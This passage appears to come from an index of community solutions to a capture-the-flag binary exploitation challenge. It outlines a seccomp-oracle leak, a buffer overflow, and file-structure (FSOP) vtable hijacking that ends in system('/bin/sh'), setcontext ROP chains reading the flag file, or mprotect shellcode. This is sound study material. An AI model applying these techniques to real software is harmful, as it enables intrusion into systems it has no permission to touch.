Install a new filter that makes `open()` return `ERRNO(0)` (V2) for the specific example file. Trigger the "load example" code path → `fopen` returns a `FILE *` backed by stdin → `fread` reads attacker-controlled data → overflow `filter_buf` (0x1000 bytes) + overwrite `stream` pointer (V3).

##### Phase 3 — FSOP via Fake FILE Structure

The overflowed buffer contains a forged `_IO_FILE_plus` structure with a fake vtable. When `fclose(stream)` is called, it dispatches through the fake vtable, giving RIP control.

#### Exploit Path Variants (Phase 3 Finish)

##### Path A — `system("/bin/sh")` or `system(";sh;")` via vtable hijack (~50%)

**Used by:** Solutions 370, 821, 14, 2972, 3972, 38838, 408

Place `"/bin/sh"` or `";sh;"` in the `_flags` field of the fake FILE. Point the vtable's `__finish` or `__close` entry at `system`. When `fclose` calls `vtable->__finish(fp)`, it executes `system(fp)` where `fp` starts with the shell command string.

Some solutions use `_IO_str_overflow` or `_vtable_offset` tricks to call `system` through `_IO_str_jumps` instead of directly forging the entire vtable.

##### Path B — `setcontext` + ORW ROP Chain (~40%)

**Used by:** Solutions exp.py (main), 8153, 9251, 22319, 31599, 34817, 35282

Point the vtable's `__finish` at `setcontext+53` (glibc 2.23). The `setcontext` gadget loads registers from the `_IO_FILE` structure fields (treating `rdi` as the struct pointer), then pivots the stack to an attacker-controlled ROP chain. The ROP chain performs:

```python
open("/home/seccomp-tools/flag", O_RDONLY)
read(fd, buffer, 0x100)
write(1, buffer, 0x100)
```

This approach is preferred because `execve` may be blocked by previously installed seccomp filters.

##### Path C — `mprotect` + Shellcode (~10%)

**Used by:** Solutions 5586, 8153

After gaining RIP control via FSOP, use a ROP chain to call `mprotect(bss_page, 0x1000, RWX)` followed by jumping to shellcode embedded in the BSS buffer. The shellcode performs ORW to read the flag.

##### Path D — Format String via FSOP → Two-Stage Leak + Shell

**Used by:** Solution 6748

Instead of directly calling `system`, forge the FILE struct to trigger `printf` with a format string (`%21$p`) to leak a stack/libc address. Then perform a second FSOP round to call `system` with the fully resolved address.

#### Oracle Technique Variants

| Technique | Speed | Used By |
|-----------|-------|---------|
| Bit-by-bit probing (36-48 iterations per address) | ~30-60s | 370, 1980, 5586, 8153, 9251, 35282, 38838 |
| Binary search on 16-bit chunks (log₂ probes per chunk) | ~15-30s | 31599, 34817, 408 |
| Byte-by-byte with `fread` size encoding | ~40-50s | exp.py (main), 821 |
| Nibble-by-nibble via `write` size side-channel | ~60-90s | 3972 |
| 256-value brute per byte (linear scan) | ~120s+ | 370, 2972 |

### Assets and Provenance

#### Solution Write-ups

| File | Leak Technique | Finish | Notes |
|------|---------------|--------|-------|
| `370.md` | Byte scan via fread size encoding | `system(";sh;")` via vtable | Two scripts; detailed BPF rule construction |
| `821.md` | Byte-by-byte fread size oracle | `_IO_str_overflow` → `system` | Detailed 3-step explanation; seccomp filter tree priority |
| `14.md` | Bit-by-bit probing (48 iterations) | `setcontext` + mprotect + shellcode | Uses `seccomp-tools asm` for rule compilation |
| `1980.md` | Bit-by-bit probing | Fake FILE vtable → `system` | Heap leak approach with `args[1]` |
| `2972.md` | Binary search on open args[0] | FSOP vtable `system(";sh;")` | Uses `seccomp-tools asm` for compilation |
| `3972.md` | Nibble-by-nibble via write() args | Format string leak → `system` | Most creative: uses various write() triggers |
| `5586.md` | Byte-by-byte via fread internal reads | `setcontext` → mprotect + ORW shellcode | Detailed BPF oracle using read size encoding |
| `6748.md` | Binary search on 16-bit chunks | `setcontext` → mprotect + shellcode | Elegant exploit with minimal filter count |
| `8153.md` | Bit probing via `fopen` success/fail | `setcontext` + ORW ROP | Uses `mprotect` + shellcode as final stage |
| `9251.md` | Binary search open args + seccomp tree | `setcontext` → stack pivot → ORW ROP | Detailed seccomp filter tree priority explanation |
| `22319.md` | Bit-by-bit with multiple read sizes | Fake FILE `_IO_finish` → `setcontext` | Uses `FileStructure` from pwntools |
| `31599.md` | Binary search on `instruction_pointer` | `setcontext` + ORW ROP chain | Clean binary search; separate PIE + libc leaks |
| `34817.md` | Binary search via BPF `jge` | `setcontext` + `openat` ORW ROP | Uses `SECCOMP_ASSEMBLER.py` helper |
| `35282.md` | Bit-by-bit via fread size + offset | Fake FILE vtable → `one_gadget` / `system` | Heap address + libc leak |
| `38838.md` | Binary search on 16-bit halves | `setcontext` + ORW ROP | Uses `FileStructure`; clean 2-stage leak |
| `408.md` | Bit-by-bit with read size/offset encoding | Fake FILE → `execve` | Simplest vtable hijack |

#### Files

| File | Description |
|------|-------------|
| `exp.py` | Working exploit: BPF oracle + House of Spirit + FSOP → ORW ROP |
| `IO_FILE.py` | Helper: `_IO_FILE_plus` and `_IO_jump_t` struct constructors |
| `SECCOMP_ASSEMBLER.py` | Helper: BPF assembly → bytecode compiler |
| `desc.txt` | Challenge description |
| `artifacts/` | Original challenge binary and libc |
| `solution/*.md` | Community write-ups (16 solutions) |
